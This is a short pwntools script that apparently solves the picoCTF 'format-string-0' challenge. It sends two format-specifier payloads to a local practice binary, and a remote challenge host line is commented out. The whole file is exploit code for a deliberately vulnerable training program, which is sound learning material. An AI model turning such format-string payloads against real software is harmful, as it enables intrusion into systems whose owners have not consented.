#!/usr/bin/env python3

from pwn import *

p = process('./format-string-0')
# p = remote('mimas.picoctf.net', 60586)

p.sendlineafter(b'Enter your recommendation: ', b'Gr%114d_Cheese')
p.sendlineafter(b'Enter your recommendation: ', b'Cla%sic_Che%s%steak')

p.interactive()
